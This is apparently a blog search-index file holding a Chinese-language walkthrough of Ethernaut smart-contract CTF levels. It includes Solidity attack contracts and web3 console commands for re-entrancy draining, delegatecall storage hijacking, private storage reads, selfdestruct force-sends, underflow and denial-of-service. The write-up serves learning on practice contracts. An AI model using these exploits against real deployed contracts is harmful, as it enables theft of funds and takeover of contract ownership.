<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/03/26/Capture%20The%20Ether/"/>
      <url>/2023/03/26/Capture%20The%20Ether/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>周报</title>
      <link href="/2023/02/25/Ethernaut/"/>
      <url>/2023/02/25/Ethernaut/</url>
      
        <content type="html"><![CDATA[<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><p>  有两个函数可更改owner,函数contribute()可转入钱，要更改owner需要转入的大于合约拥有者的contributions，但每次只能转入0.001 ether，需要转入很多次。<br>  另一种方法让msg.value&gt;0同时我们的contributions&gt;0就可以改变owner。<br>  所以只需要先向函数contribute()转入1 wei使contributions&gt;0，再向合约转入1 wei调用receive就可更改owner。</p><h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><p> Fal1out()不是构造函数，与合约名字不同，所以可以直接调用Fal1out()获得控制权。</p><h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><p>硬币正反与区块高度有关，并且不会与上次相同，连续才对十次就需要提前计算结果，区块高度是可以知道的，所以先计算coinFile再传入合约就可以猜对一次，因为要求区块高度不能相同，所以需要连续计算十次结果。需要写个攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    CoinFlip constant private target = CoinFlip(0x41b21013f1470Fcd1e08988ef87ed88aD38037a1);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip = blockValue/FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><p>需要区分一下tx.origin和msg.sender，msg.sender是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而tx.origin则必然是这个交易的原始发起方，无论中间有多少次合约内&#x2F;跨合约函数调用，而且一定是账户地址而不是合约地址。所以需要写个合约调用该合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone constant private target = Telephone(0x6F28D4210D178F6B37bFBe8D1dD8b08402EaC12a);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>因为balances[msg.sender]和value都是uint，因此他们相减的结果一定仍然是uint(可能会存在下溢出)，所以一定大于等于0<br>然后下面出现下溢出：balances[_to] +&#x3D; _value;，使得余额变得很多。<br>直接在控制台输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.transfer(&quot;0xc6Ef69fBCEFc582E248b32fDB48f9BC685F6b1b1&quot;,21)</span><br></pre></td></tr></table></figure><p>因此初始余额是20，所以减21。</p><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>因为执行环境会变成调用者的环境，这个调用者即是Delegation合约，因此虽然调用的是Delegate合约里的pwn函数，但是修改的并不是Delegate合约里的owner，而是Delegation里的owner。就相当于直接让delegatecall调用pwn函数就可以了。delegatecall的参数二进制编码可以在本地算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    bytes4 public result;</span><br><span class="line">    function test() public  &#123;</span><br><span class="line">        result = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行得到二进制编码为 0xdd365b8b ，</p><h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>查了一下，需要用到selfdestruct()合约自毁函数<br>指令执行后，合约将拒绝服务，地址对应的字节码将被标注为删除<br>.合约地址中所有的ETH将被发送到指定的新地址<br>进行ETH转移时，即使目标地址为一个合约地址，也不会触发该地址的fallback函数，因此不需要该合约有任何的payable函数<br>如果selfdestruct函数被非预期的执行，则整个合约会拒绝服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attack(address _addr) payable public &#123;</span><br><span class="line">        selfdestruct(payable(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><p>bool占用slot0，因此password在slot1<br>在控制台输入，await web3.eth.getStorageAt(contract.address,1)<br>‘0x412076657279207374726f6e67207365637265742070617373776f7264203a29’<br>就可以很轻松的获取到password，随后继续输入await contract.unlock()（括号中填入刚刚查到的password）</p><h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    address target = 0x20b5Ff3460aE2a6C7D8fdE858CD1C6e1311445D4;</span><br><span class="line">    function attack() payable public &#123;</span><br><span class="line">        target.call&#123;value : 1 ether&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        require(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>利用重入攻击把合约的钱都拿出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address target = 0x6f28304754abDd1c6511ed74d7E548fff87eFE9a;</span><br><span class="line">    function hack() payable public &#123;</span><br><span class="line">        target.call&#123;value:1 ether&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,this));</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,1 ether));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    fallback() payable external &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,1 ether));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>让top为true即可。<br>构造个Building合约，实现接口中的信息，然后让第一次调用isLastFloor返回false，第二次调用isLastFloor返回true即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract Building &#123;</span><br><span class="line">    address public target = 0x802450E17Ad3e0D1484bb8817EF76505FFB7FcB1;</span><br><span class="line">    bool public flag = false;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">        if(flag == false)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><p>控制台输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.getStorageAt(contract.address,5)</span><br></pre></td></tr></table></figure><p>得到’0xe08876792483327163e653b01885fbe7359a934a9e2edf94cb4a2e807d07f17e’<br>再输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.unlock(&quot;0xe08876792483327163e653b01885fbe7&quot;)</span><br></pre></td></tr></table></figure><p>括号里是刚得到的前32位</p><h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><p>gateOne:只需要我们通过攻击合约调用合约<br>gateTwo:需要gas.left().mod(8191)&#x3D;&#x3D;0，也就是我们执行到这一步所剩余的gas是8191的倍数，执行后才能进行完成。<br>gateThree:第一条件需要32位的gateKey等于16位的gateKey,也就是gateKey的第17-32位全为零。<br>第二条件需要32位的gateKey与64位的gateKey不想等，也就是33-64位不全为零。<br>第三条件需要gateKey的前十六位等于tx.origin。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    GatekeeperOne gat;</span><br><span class="line">    constructor(address addr)public&#123;</span><br><span class="line">        gat = GatekeeperOne(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        bytes8 _addr = bytes8(uint64(msg.sender) &amp; 0xffffffff0000ffff);</span><br><span class="line">        gat.enter(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h1><p>gateOne:需要攻击合约<br>gateTwo:assembly是用于写汇编语言的，extcodesize（caller()）的意思是调用者的地址为零，合约尚未构造完成时，所以我们需要在构造函数中进行攻击。<br>gateThree:我们传进去的值需要与我们的合约地址进行异或算法且为2^64-1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    GatekeeperTwo gat;</span><br><span class="line">    //为满足合约地址为零，在构造函数中进行攻击</span><br><span class="line">    constructor(address addr)public&#123;</span><br><span class="line">        gat = GatekeeperTwo(addr);</span><br><span class="line">        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0)-1);</span><br><span class="line">        gat.enter(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin\"></a>Naught Coin\</h1><p>我们要调用transferFrom函数就需要先给调用者我们余额的使用权限，在控制台输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.approve(contract.address,await contract.balanceof(player))</span><br></pre></td></tr></table></figure><p>然后再输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.transferFrom(player,contract.address,await contract.balanceOf(player))</span><br></pre></td></tr></table></figure><p>即可完成攻击</p><h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><p>delegatecall在调用时如果需要修改storage变量，他并不会通过变量名称去当前合约中查找相应的变量进行值的替换，而是会通过变量在被调用合约中的插槽进行改变。</p><p>而storedTime在Library合约中存在了slot(0),但是在Preservation合约中slot 0存放的数据是timeZone1Library，也就是第一个library合约的地址，如果我们将这个地址修改为我们的攻击合约，那么之后在调用setFirstTime的时候，就会调用我们自己的setTime函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address public addr1;</span><br><span class="line">    address public addr2;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    function setTime(uint _time)public&#123;</span><br><span class="line">        owner = address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><p>我们去 区块链浏览器上，很明显能看出交易全过程，我们创建了实例，关卡合约创建了工厂合约，工厂合约再创建了代币合约。所以最后一个地址就是我们要找到的地址。<br>接着找回丢失的以太。我们通过encodeFunctionSignature获取函数指示，并构造参数。最后通过sendTransaction发送出来。输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.sendTransaction(&#123;from:player,to:target,data:await web3.eth.abi.encodeWithSignature(“destroy(address)”) + &quot;000000000000000000000000 +“目标合约地址”&#125;)</span><br></pre></td></tr></table></figure><p>即可完成攻击，提交实例，关卡完成。</p><h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><p>await web3.eth.sendTransaction({from:player,data:”0x600a600c600039600a6000f3602A60805260206080f3”});<br>contract.setSolver();</p><h1 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IAlienCodex &#123;</span><br><span class="line">    function revise(uint i, bytes32 _content) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlienCodex &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line">    </span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">      levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function claim() public &#123;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));</span><br><span class="line">            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IDenial &#123;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        IDenial(levelInstance).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function set() public &#123;</span><br><span class="line">        IDenial(levelInstance).setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        IShop(levelInstance).buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
